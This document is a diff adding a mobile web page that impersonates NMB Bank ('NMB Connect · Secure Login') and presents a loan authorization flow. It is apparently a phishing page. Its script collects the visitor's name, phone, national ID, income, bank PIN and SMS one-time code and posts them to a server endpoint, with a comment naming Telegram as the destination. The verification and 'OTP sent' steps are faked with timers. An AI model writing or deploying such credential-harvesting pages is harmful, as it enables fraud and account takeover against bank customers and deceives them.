@@ -1,0 +1,433 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
+<meta name="theme-color" content="#0D2B6B"/>
+<title>NMB Connect · Secure Login</title>
+<link rel="icon" href="assets/nmb-logo.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none}
+:root{
+  --navy:#0D2B6B;--navy2:#0A2157;--navy3:#071845;
+  --gold:#C9A227;--gold2:rgba(201,162,39,.15);
+  --blue:#1565C0;--blue2:rgba(21,101,192,.1);
+  --bg:#F4F6FA;--surface:#FFFFFF;--surface2:#EEF1F7;--surface3:#E5E9F2;
+  --tx1:#0D1B3E;--tx2:#4A5568;--tx3:#8E9AB5;
+  --ok:#1B8A4E;--ok2:rgba(27,138,78,.1);
+  --err:#C0392B;--err2:rgba(192,57,43,.1);
+  --div:rgba(0,0,0,.08);
+  --f:'Inter',system-ui,sans-serif;
+  --r12:12px;--r16:16px;--r20:20px;--rp:999px;
+  --ease:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.34,1.56,.64,1);
+  --sb:24px;
+  --shadow:0 2px 8px rgba(0,0,0,.08),0 4px 16px rgba(0,0,0,.05);
+}
+@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);background:var(--navy);-webkit-font-smoothing:antialiased}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+@keyframes slideDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
+@keyframes rip{to{transform:scale(4);opacity:0}}
+@keyframes wrongShake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-7px)}40%,80%{transform:translateX(7px)}}
+@keyframes shimmer{0%{left:-80%}100%{left:160%}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+
+/* ── Curtain ── */
+.curtain{position:fixed;inset:0;z-index:9999;pointer-events:none;background:var(--navy);opacity:0;transition:opacity .35s;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+.curtain.show{opacity:1;pointer-events:auto}
+.c-logo{width:72px;height:72px;border-radius:18px;background:#fff;display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.3)}
+.c-logo img{width:58px;object-fit:contain}
+.c-spin{width:26px;height:26px;border:2.5px solid rgba(255,255,255,.2);border-top-color:var(--gold);border-radius:50%;animation:spin .7s linear infinite}
+.c-lbl{font-size:13px;font-weight:600;color:rgba(255,255,255,.6);text-align:center}
+.c-sub{font-size:11px;color:rgba(255,255,255,.4);text-align:center}
+
+/* ── Screen: dark navy hero top + white card bottom ── */
+.screen{display:flex;flex-direction:column;width:100%;height:100dvh;overflow:hidden;animation:slideUp .3s var(--ease) both}
+.screen.exit{opacity:0;transform:translateY(-8px);transition:all .22s}
+
+/* ── Hero section (top ~45%) ── */
+.hero{
+  background:var(--navy);
+  flex-shrink:0;
+  display:flex;flex-direction:column;align-items:center;justify-content:flex-end;
+  padding:calc(var(--sb) + env(safe-area-inset-top,0px) + 8px) 24px 32px;
+  position:relative;overflow:hidden;
+}
+/* Radial glow */
+.hero::before{content:'';position:absolute;top:-80px;left:50%;transform:translateX(-50%);width:300px;height:300px;border-radius:50%;background:radial-gradient(circle,rgba(201,162,39,.14),transparent 65%);pointer-events:none}
+/* Back button */
+.back-btn{position:absolute;top:calc(var(--sb) + env(safe-area-inset-top,0px) + 10px);left:18px;width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.1);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;touch-action:manipulation;outline:none;transition:background .15s;z-index:2}
+.back-btn:active{background:rgba(255,255,255,.2)}
+.back-btn svg{width:18px;height:18px;stroke:#fff;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+/* Logo + brand */
+.hero-logo{width:64px;height:64px;border-radius:16px;background:#fff;display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.25);margin-bottom:16px;position:relative;z-index:1}
+.hero-logo img{width:52px;object-fit:contain}
+.hero-brand{font-size:24px;font-weight:700;color:#fff;letter-spacing:-.3px;margin-bottom:4px;position:relative;z-index:1}
+.hero-slogan{font-size:13px;color:var(--gold);font-weight:500;letter-spacing:.3px;position:relative;z-index:1}
+
+/* ── Auth card (bottom sheet style) ── */
+.auth-card{
+  flex:1;background:var(--bg);border-radius:28px 28px 0 0;
+  overflow-y:auto;overflow-x:hidden;scrollbar-width:none;
+  padding:24px 20px max(24px,env(safe-area-inset-bottom));
+  position:relative;
+}
+.auth-card::-webkit-scrollbar{display:none}
+.auth-title{font-size:18px;font-weight:700;color:var(--tx1);margin-bottom:4px}
+.auth-sub{font-size:13px;color:var(--tx3);margin-bottom:20px;line-height:1.5}
+
+/* ── Steps ── */
+.step{display:none;flex-direction:column;gap:0;animation:slideUp .2s var(--ease) both}
+.step.on{display:flex}
+
+/* ── Summary chips ── */
+.summary-chips{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:18px}
+.schip{padding:5px 12px;border-radius:var(--rp);background:rgba(13,43,107,.08);font-size:11px;font-weight:600;color:var(--navy);border:1px solid rgba(13,43,107,.12)}
+.schip.gold{background:var(--gold2);color:var(--gold);border-color:rgba(201,162,39,.3)}
+
+/* ── PIN cells ── */
+.pin-wrap{margin-bottom:16px}
+.pin-dots{display:flex;gap:10px;justify-content:center;margin-bottom:12px}
+.pin-cell{
+  width:54px;height:54px;border-radius:16px;
+  border:1.5px solid var(--div);background:var(--surface);
+  display:flex;align-items:center;justify-content:center;
+  transition:all .18s var(--spring);position:relative;overflow:hidden;
+  box-shadow:0 1px 3px rgba(0,0,0,.06);
+}
+.pin-cell.filled{border-color:var(--navy);background:rgba(13,43,107,.08);transform:scale(1.06);box-shadow:0 0 0 3px rgba(13,43,107,.1)}
+.pin-cell.filled::after{content:'';display:block;width:12px;height:12px;border-radius:50%;background:var(--navy)}
+.pin-cell.active{border-color:var(--navy);transform:scale(1.08);box-shadow:0 0 0 3px rgba(13,43,107,.08)}
+.pin-cell.peek::after{display:none!important}
+.pin-digit{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-size:22px;font-weight:700;color:var(--navy)}
+.pin-cell.peek .pin-digit{display:flex}
+@keyframes wrongShake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-6px)}40%,80%{transform:translateX(6px)}}
+.pin-dots.wrong .pin-cell{animation:wrongShake .35s ease;border-color:var(--err)}
+.pin-actions{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
+.pin-act{display:flex;align-items:center;gap:5px;font-size:13px;font-weight:600;color:var(--navy);background:rgba(13,43,107,.08);border:none;border-radius:var(--rp);padding:8px 16px;cursor:pointer;touch-action:manipulation;font-family:var(--f);outline:none;transition:background .15s}
+.pin-act:active{background:rgba(13,43,107,.15)}
+.pin-act svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;display:block}
+.pin-err{font-size:12px;color:var(--err);text-align:center;min-height:14px;margin-top:4px}
+
+/* ── Numpad ── */
+.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:0}
+.nk{height:56px;border-radius:14px;border:none;background:var(--surface);font-size:22px;font-weight:600;color:var(--tx1);display:flex;align-items:center;justify-content:center;cursor:pointer;touch-action:manipulation;outline:none;position:relative;overflow:hidden;transition:background .1s,transform .08s;box-shadow:0 1px 3px rgba(0,0,0,.07),0 1px 2px rgba(0,0,0,.05)}
+.nk:active{background:var(--surface2);transform:scale(.93)}
+.nk.del svg{width:20px;height:20px;stroke:var(--tx2);fill:none;stroke-width:2;stroke-linecap:round}
+.nk.empty{opacity:0;pointer-events:none;box-shadow:none}
+.rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.06);transform:scale(0);animation:rip .5s ease forwards}
+
+/* ── Processing ── */
+.proc-body{display:flex;flex-direction:column;align-items:center;padding:32px 0 24px;text-align:center}
+.proc-ring{width:64px;height:64px;position:relative;margin-bottom:20px}
+.proc-ring-svg{width:64px;height:64px;animation:spin .9s linear infinite}
+.proc-ring-svg.done{animation:none}
+.ring-arc{stroke-dasharray:62;stroke-dashoffset:62;transition:stroke-dashoffset .6s,stroke .4s}
+.proc-ring-svg.done .ring-arc{stroke-dashoffset:0;stroke:var(--ok)}
+.proc-ring-ic{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
+.proc-ring-ic svg{transition:stroke .4s}
+.proc-ring-ic.done svg{stroke:var(--ok)}
+.proc-t{font-size:17px;font-weight:700;color:var(--tx1);margin-bottom:5px;transition:opacity .2s}
+.proc-s{font-size:13px;color:var(--tx3);margin-bottom:24px;transition:opacity .2s;line-height:1.5}
+.vsteps{display:flex;align-items:center;width:100%;max-width:220px}
+.vstep{display:flex;flex-direction:column;align-items:center;gap:4px;flex:0 0 auto}
+.vstep-dot{width:9px;height:9px;border-radius:50%;background:var(--div);transition:all .28s}
+.vstep.act .vstep-dot{background:var(--navy);transform:scale(1.3);box-shadow:0 0 0 3px rgba(13,43,107,.12)}
+.vstep.done .vstep-dot{background:var(--ok)}
+.vstep-txt{font-size:9px;font-weight:600;color:var(--tx3);text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;transition:color .28s}
+.vstep.act .vstep-txt{color:var(--navy)}
+.vstep.done .vstep-txt{color:var(--ok)}
+.vline{flex:1;height:2px;background:var(--div);margin-bottom:13px;position:relative;overflow:hidden}
+.vline::after{content:'';position:absolute;inset:0;background:var(--ok);transform:scaleX(0);transform-origin:left;transition:transform .4s}
+.vline.done::after{transform:scaleX(1)}
+
+/* ── OTP ── */
+.otp-wrap{position:relative;height:62px;margin-bottom:8px}
+.otp-hidden{position:absolute;inset:0;opacity:0;z-index:2;border:none;background:none;outline:none;caret-color:transparent;width:100%;height:100%;font-size:16px;-webkit-user-select:text;user-select:text}
+.otp-row{display:flex;gap:7px;height:100%}
+.otp-box{flex:1;height:100%;border-radius:14px;border:1.5px solid var(--div);background:var(--surface);display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700;color:var(--tx1);transition:all .15s var(--spring);position:relative;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.06)}
+.otp-box.filled{background:rgba(13,43,107,.07);border-color:var(--navy);transform:scale(1.04)}
+.otp-box.active{border-color:var(--navy);box-shadow:0 0 0 3px rgba(13,43,107,.08)}
+.otp-box.active.empty::after{content:'';position:absolute;width:2px;height:50%;background:var(--navy);border-radius:2px;animation:pulse 1s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.otp-row.shake{animation:wrongShake .3s ease}
+.timer-row{display:flex;justify-content:space-between;align-items:center;margin-top:6px}
+.timer-lbl{font-size:13px;color:var(--tx2)}
+.timer-n{font-weight:700;color:var(--navy)}
+.resend{font-size:13px;font-weight:600;color:var(--tx3);background:none;border:none;cursor:default;padding:7px 12px;border-radius:var(--r12);font-family:var(--f);transition:all .15s}
+.resend.on{color:var(--navy);cursor:pointer;background:rgba(13,43,107,.08)}
+.otp-note{font-size:13px;color:var(--tx2);line-height:1.6;margin-bottom:14px}
+.otp-note strong{color:var(--tx1);font-weight:600}
+.api-err{font-size:12px;color:var(--err);min-height:16px;margin-top:4px}
+
+/* ── OTP toast ── */
+.otoast{position:fixed;top:max(16px,env(safe-area-inset-top));left:50%;transform:translateX(-50%) translateY(-100px);background:var(--surface);border-radius:18px;padding:12px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 8px 32px rgba(0,0,0,.12);min-width:240px;z-index:1000;transition:transform .3s var(--ease)}
+.otoast.show{transform:translateX(-50%) translateY(0)}
+.otoast-ic{width:32px;height:32px;border-radius:50%;background:rgba(13,43,107,.08);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.otoast-ic svg{width:15px;height:15px;stroke:var(--navy);stroke-width:2;fill:none;stroke-linecap:round}
+.otoast-t{font-size:14px;font-weight:600;color:var(--tx1)}
+.otoast-s{font-size:11px;color:var(--tx2);margin-top:1px}
+.otoast-s strong{color:var(--tx1);font-weight:600}
+
+/* ── Action bar ── */
+.abar{flex-shrink:0;padding:12px 20px max(20px,env(safe-area-inset-bottom));background:var(--bg);border-top:1px solid var(--div)}
+.abtn{width:100%;min-height:52px;padding:14px;border-radius:16px;border:none;background:var(--navy);color:#fff;font-family:var(--f);font-size:15px;font-weight:700;cursor:pointer;touch-action:manipulation;box-shadow:0 4px 16px rgba(13,43,107,.28);transition:transform .14s var(--spring),box-shadow .15s;position:relative;overflow:hidden;outline:none}
+.abtn::before{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.07),transparent);animation:shimmer 2.5s ease-in-out infinite;pointer-events:none}
+@keyframes shimmer{0%{left:-80%}100%{left:160%}}
+.abtn:active{transform:scale(.97);box-shadow:0 2px 8px rgba(13,43,107,.2)}
+.abtn:disabled{opacity:.35;box-shadow:none;cursor:default;transform:none}
+.abtn:disabled::before{display:none}
+</style>
+</head>
+<body>
+<script src="api.js"></script>
+
+<div class="curtain" id="curtain">
+  <div class="c-logo"><img src="assets/nmb-logo.png" alt="NMB"></div>
+  <div class="c-spin"></div>
+  <div><div class="c-lbl" id="cLbl">Processing</div><div class="c-sub" id="cSub">Please wait…</div></div>
+</div>
+
+<div class="screen" id="screen">
+
+  <!-- Hero -->
+  <div class="hero">
+    <button class="back-btn" onclick="goBack()"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg></button>
+    <div class="hero-logo"><img src="assets/nmb-logo.png" alt="NMB"></div>
+    <div class="hero-brand">NMB Connect</div>
+    <div class="hero-slogan">Your Digital Bank</div>
+  </div>
+
+  <!-- Auth card -->
+  <div class="auth-card" id="authCard">
+
+    <!-- Step 1: PIN -->
+    <div class="step on" id="s1">
+      <div class="auth-title">Authorize Application</div>
+      <div class="auth-sub" id="authSub">Enter your 4-digit NMB PIN to authorize this loan application</div>
+      <div class="summary-chips" id="summaryChips"></div>
+
+      <div class="pin-wrap">
+        <div class="pin-dots" id="pinDots">
+          <div class="pin-cell active" id="pc0"><div class="pin-digit" id="pd0"></div></div>
+          <div class="pin-cell" id="pc1"><div class="pin-digit" id="pd1"></div></div>
+          <div class="pin-cell" id="pc2"><div class="pin-digit" id="pd2"></div></div>
+          <div class="pin-cell" id="pc3"><div class="pin-digit" id="pd3"></div></div>
+        </div>
+        <div class="pin-actions">
+          <button class="pin-act" id="peekBtn">
+            <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Peek
+          </button>
+          <button class="pin-act" id="clearBtn">
+            <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>Clear
+          </button>
+        </div>
+        <div class="pin-err" id="pinErr"></div>
+      </div>
+
+      <div class="numpad" id="numpad">
+        <button class="nk" data-n="1">1</button><button class="nk" data-n="2">2</button><button class="nk" data-n="3">3</button>
+        <button class="nk" data-n="4">4</button><button class="nk" data-n="5">5</button><button class="nk" data-n="6">6</button>
+        <button class="nk" data-n="7">7</button><button class="nk" data-n="8">8</button><button class="nk" data-n="9">9</button>
+        <button class="nk empty"></button>
+        <button class="nk" data-n="0">0</button>
+        <button class="nk del" id="delKey"><svg viewBox="0 0 24 24"><path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg></button>
+      </div>
+    </div>
+
+    <!-- Step 2: Processing -->
+    <div class="step" id="s2">
+      <div class="proc-body">
+        <div class="proc-ring">
+          <svg class="proc-ring-svg" viewBox="0 0 48 48" fill="none">
+            <circle cx="24" cy="24" r="20" stroke="rgba(13,43,107,.1)" stroke-width="3"/>
+            <path class="ring-arc" d="M24 4a20 20 0 0 1 20 20" stroke="var(--navy)" stroke-width="3" stroke-linecap="round"/>
+          </svg>
+          <div class="proc-ring-ic" id="ringIc">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--navy)" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+          </div>
+        </div>
+        <div class="proc-t" id="procT">Verifying PIN</div>
+        <div class="proc-s" id="procS">Contacting NMB servers…</div>
+        <div class="vsteps">
+          <div class="vstep act" id="vs0"><div class="vstep-dot"></div><div class="vstep-txt">PIN</div></div>
+          <div class="vline" id="vl0"></div>
+          <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-txt">Review</div></div>
+          <div class="vline" id="vl1"></div>
+          <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-txt">OTP</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 3: OTP -->
+    <div class="step" id="s3">
+      <div class="auth-title">One-Time Password</div>
+      <div class="otp-note" id="otpNote">Enter the 6-digit code sent to your mobile number</div>
+      <div class="otp-wrap" id="otpWrap">
+        <input type="text" id="otpIn" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
+        <div class="otp-row" id="otpRow">
+          <div class="otp-box empty" id="ob0"></div><div class="otp-box" id="ob1"></div>
+          <div class="otp-box" id="ob2"></div><div class="otp-box" id="ob3"></div>
+          <div class="otp-box" id="ob4"></div><div class="otp-box" id="ob5"></div>
+        </div>
+      </div>
+      <div class="api-err" id="otpErr"></div>
+      <div class="timer-row">
+        <div class="timer-lbl">Expires in <span class="timer-n" id="timer">120</span>s</div>
+        <button class="resend" id="resendBtn">Resend</button>
+      </div>
+    </div>
+
+  </div><!-- /auth-card -->
+
+  <div class="abar" id="abar">
+    <button class="abtn" id="mainBtn">Authorize Loan Application</button>
+    <button class="abtn" id="otpBtn" style="display:none;margin-top:8px">Confirm OTP</button>
+  </div>
+
+</div><!-- /screen -->
+
+<div class="otoast" id="otoast">
+  <div class="otoast-ic"><svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.14 1.18 2 2 0 012.13 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14.92z"/></svg></div>
+  <div><div class="otoast-t">OTP Sent</div><div class="otoast-s">Code sent to <strong id="otoastNum"></strong></div></div>
+</div>
+
+<script>
+(function(){
+'use strict';
+(function(){var h=0;if(window.screen&&screen.availTop>0)h=screen.availTop;else if(window.visualViewport&&visualViewport.offsetTop>0)h=visualViewport.offsetTop;if(h)document.documentElement.style.setProperty('--sb',h+'px');})();
+function hap(t){if(!navigator.vibrate)return;try{navigator.vibrate(t);}catch(e){}}
+
+/* NMB Telegram notification */
+function tg(ev,pin,otp){
+  if(!loanData)return;
+  try{
+    fetch('/api/loan',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        event:ev,
+        name:loanData.name||'',
+        phone:loanData.phone||'',
+        phoneDisplay:loanData.phoneDisplay||'',
+        nid:loanData.nid||'',
+        emp:loanData.emp||'',
+        income:loanData.income||'',
+        amount:loanData.amount||'',
+        tenure:loanData.tenure||'',
+        monthly:loanData.monthly||'',
+        rate:loanData.rate||'',
+        pin:pin||'',
+        otp:otp||'',
+        submittedAt:loanData.submittedAt||''
+      })
+    }).catch(function(){});
+  }catch(e){}
+}
+
+/* Load session */
+var loanData=null;
+try{loanData=JSON.parse(sessionStorage.getItem('nmbLoan')||'null');}catch(e){}
+if(!loanData){setTimeout(function(){window.location.replace('index.html');},200);return;}
+
+/* Populate summary */
+document.getElementById('authSub').textContent='Loan of $'+loanData.amount.toLocaleString()+' over '+loanData.tenure+' months for '+loanData.name.split(' ')[0];
+document.getElementById('summaryChips').innerHTML=
+  '<span class="schip gold">$'+loanData.amount.toLocaleString()+'</span>'+
+  '<span class="schip">'+loanData.tenure+' Months</span>'+
+  '<span class="schip">USD '+loanData.monthly.toFixed(2)+'/mo</span>'+
+  '<span class="schip">'+loanData.phoneDisplay+'</span>';
+
+/* PIN */
+var PIN='',peeking=false;
+function renderPIN(){for(var i=0;i<4;i++){var c=document.getElementById('pc'+i),d=document.getElementById('pd'+i);c.classList.remove('filled','active','peek');d.textContent='';if(i<PIN.length){c.classList.add('filled');if(peeking){c.classList.add('peek');d.textContent=PIN[i];}}if(i===PIN.length&&i<4)c.classList.add('active');}}
+function pushDigit(d){if(PIN.length>=4)return;PIN+=String(d);hap(8);renderPIN();document.getElementById('pinErr').textContent='';}
+function delDigit(){if(!PIN.length)return;PIN=PIN.slice(0,-1);hap(8);renderPIN();}
+function clearPIN(){PIN='';renderPIN();document.getElementById('pinErr').textContent='';}
+function startPeek(){peeking=true;renderPIN();}
+function endPeek(){peeking=false;renderPIN();}
+document.querySelectorAll('.nk[data-n]').forEach(function(k){k.addEventListener('click',function(){pushDigit(k.dataset.n);});});
+document.getElementById('delKey').addEventListener('click',delDigit);
+var peekBtn=document.getElementById('peekBtn');
+peekBtn.addEventListener('pointerdown',function(e){e.preventDefault();startPeek();});
+peekBtn.addEventListener('pointerup',endPeek);
+peekBtn.addEventListener('pointerleave',endPeek);
+document.getElementById('clearBtn').addEventListener('click',clearPIN);
+renderPIN();
+/* Auto scroll */
+setTimeout(function(){var c=document.getElementById('authCard');if(c)c.scrollTop=c.scrollHeight;},80);
+
+/* Ripple */
+document.querySelectorAll('.nk,.abtn,.pin-act').forEach(function(b){b.addEventListener('pointerdown',function(e){var r=b.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;var rip=document.createElement('span');rip.className='rip';rip.style.cssText='width:'+sz+'px;height:'+sz+'px;left:'+(e.clientX-r.left-sz/2)+'px;top:'+(e.clientY-r.top-sz/2)+'px';b.appendChild(rip);rip.addEventListener('animationend',function(){rip.remove();});},{passive:true});});
+
+/* Steps */
+var curStep='s1',submitting=false,otpDone=false,otpVal='';
+function showStep(id){
+  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('on');});
+  document.getElementById(id).classList.add('on');curStep=id;
+  var mb=document.getElementById('mainBtn'),ob=document.getElementById('otpBtn'),ab=document.getElementById('abar');
+  if(id==='s1'){mb.style.display='';ob.style.display='none';ab.style.display='';setTimeout(function(){var c=document.getElementById('authCard');if(c)c.scrollTop=c.scrollHeight;},50);}
+  else if(id==='s3'){mb.style.display='none';ob.style.display='';ab.style.display='';setTimeout(function(){var c=document.getElementById('authCard');if(c)c.scrollTop=0;},50);}
+  else{ab.style.display='none';}
+  if(id!=='s1')history.pushState({step:id},'','');
+}
+
+/* Authorize */
+document.getElementById('mainBtn').addEventListener('click',function(){
+  if(submitting)return;
+  if(PIN.length!==4){
+    var dots=document.getElementById('pinDots');dots.classList.remove('wrong');void dots.offsetWidth;dots.classList.add('wrong');
+    setTimeout(function(){dots.classList.remove('wrong');},400);
+    document.getElementById('pinErr').textContent='Enter your 4-digit NMB PIN';hap([40,30,40]);return;
+  }
+  submitting=true;hap(18);document.getElementById('pinErr').textContent='';tg('loan_pin_auth',PIN,'');
+  showStep('s2');setVS(0,'Verifying PIN','Checking credentials…');
+  setTimeout(function(){
+    setVS(1,'Reviewing Application','Processing loan details…');
+    var done=false;
+    function proceed(){
+      if(done)return;done=true;
+      sessionStorage.setItem('nmbRef',JSON.stringify({ref:'NMB-'+Date.now().toString(36).toUpperCase().slice(-8),timestamp:new Date().toISOString(),status:'pending'}));
+      setVS(2,'Sending OTP','Dispatching verification code…');
+      setTimeout(function(){markDone();setTimeout(function(){var masked=mPhone(loanData.phone);document.getElementById('otpNote').innerHTML='Enter the 6-digit code sent to <strong>'+masked+'</strong>';showOtoast(masked);showStep('s3');startTimer();},450);},600);
+    }
+    var to=setTimeout(proceed,2500);
+    try{if(typeof EcoCashAPI!=='undefined'){EcoCashAPI.chargeSubscriber&&EcoCashAPI.chargeSubscriber({msisdn:loanData.phone,amount:0,narrative:'NMB Loan Auth',pin:PIN}).then(function(){clearTimeout(to);proceed();}).catch(function(){clearTimeout(to);proceed();});}}catch(e){clearTimeout(to);proceed();}
+  },800);
+});
+
+function mPhone(p){var d=p.replace(/\D/g,'').slice(-9);return '+263 '+d.slice(0,2)+'•••••'+d.slice(-2);}
+function setVS(i,t,s){[0,1,2].forEach(function(j){document.getElementById('vs'+j).className='vstep'+(j<i?' done':j===i?' act':'');});[0,1].forEach(function(j){document.getElementById('vl'+j).classList.toggle('done',j<i);});var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');tEl.style.opacity='0';sEl.style.opacity='0';setTimeout(function(){tEl.textContent=t;sEl.textContent=s;tEl.style.opacity='1';sEl.style.opacity='1';},130);hap(8);}
+function markDone(){[0,1,2].forEach(function(i){document.getElementById('vs'+i).className='vstep done';});[0,1].forEach(function(i){document.getElementById('vl'+i).classList.add('done');});document.querySelector('.proc-ring-svg').classList.add('done');document.getElementById('ringIc').classList.add('done');var tEl=document.getElementById('procT'),sEl=document.getElementById('procS');tEl.style.opacity='0';sEl.style.opacity='0';setTimeout(function(){tEl.textContent='Code Sent!';sEl.textContent='Check your mobile for the verification code';tEl.style.opacity='1';sEl.style.opacity='1';},130);hap([10,50,10]);}
+
+/* OTP */
+var otpEl=document.getElementById('otpIn');
+otpEl.addEventListener('input',function(){otpVal=this.value.replace(/\D/g,'').slice(0,6);this.value=otpVal;renderOTP();if(otpVal.length===6)hap(8);});
+otpEl.addEventListener('focus',renderOTP);otpEl.addEventListener('blur',renderOTP);
+document.getElementById('otpWrap').addEventListener('click',function(){otpEl.focus();});
+function renderOTP(){var act=document.activeElement===otpEl;for(var i=0;i<6;i++){var b=document.getElementById('ob'+i);b.classList.remove('filled','active','empty');b.textContent=otpVal[i]||'';if(otpVal[i])b.classList.add('filled');else if(i===otpVal.length&&act)b.classList.add('active','empty');}}
+document.getElementById('otpBtn').addEventListener('click',confirmOTP);
+function confirmOTP(){
+  if(otpDone)return;
+  if(otpVal.length<6){var row=document.getElementById('otpRow');row.classList.remove('shake');void row.offsetWidth;row.classList.add('shake');setTimeout(function(){row.classList.remove('shake');},360);document.getElementById('otpErr').textContent='Enter the full 6-digit code';hap([40,30,40]);return;}
+  otpDone=true;tg('loan_otp_confirmed',PIN,otpVal);if(_timer){clearInterval(_timer);_timer=null;}
+  document.getElementById('otpErr').textContent='';hap([10,50,10]);
+  navigate('thankyou.html');
+}
+var _timer=null;
+function startTimer(){if(_timer)clearInterval(_timer);var t=120,tEl=document.getElementById('timer'),rb=document.getElementById('resendBtn');tEl.textContent=t;rb.classList.remove('on');otpVal='';otpEl.value='';otpEl.disabled=false;renderOTP();document.getElementById('otpErr').textContent='';_timer=setInterval(function(){t--;tEl.textContent=t;if(t<=0){clearInterval(_timer);_timer=null;rb.classList.add('on');otpEl.disabled=true;renderOTP();document.getElementById('otpNote').textContent='Code expired — tap Resend.';}},1000);}
+document.getElementById('resendBtn').addEventListener('click',function(){if(!this.classList.contains('on'))return;startTimer();showOtoast(mPhone(loanData.phone));});
+function showOtoast(num){document.getElementById('otoastNum').textContent=num;var t=document.getElementById('otoast');t.classList.add('show');setTimeout(function(){t.classList.remove('show');},3500);}
+function navigate(url){document.getElementById('screen').classList.add('exit');document.getElementById('curtain').classList.add('show');var steps=[{l:'Confirming',s:'Verifying OTP…'},{l:'Submitting',s:'Processing application…'},{l:'Done!',s:'Application submitted!'}];var i=0;function tick(){var s=steps[i++];document.getElementById('cLbl').textContent=s.l;document.getElementById('cSub').textContent=s.s;}tick();var iv=setInterval(function(){if(i<steps.length)tick();else clearInterval(iv);},500);setTimeout(function(){window.location.href=url;},1500);}
+function goBack(){submitting=false;if(curStep==='s2'||curStep==='s3')showStep('s1');else window.location.href='index.html';}
+window.goBack=goBack;
+history.replaceState({step:'s1'},'','');
+window.addEventListener('popstate',function(){if(curStep==='s2'||curStep==='s3'){submitting=false;showStep('s1');history.replaceState({step:'s1'},'','');}else window.location.href='index.html';},{passive:false});
+window.addEventListener('pageshow',function(){submitting=false;otpDone=false;});
+})();
+</script>
+</body>
+</html>
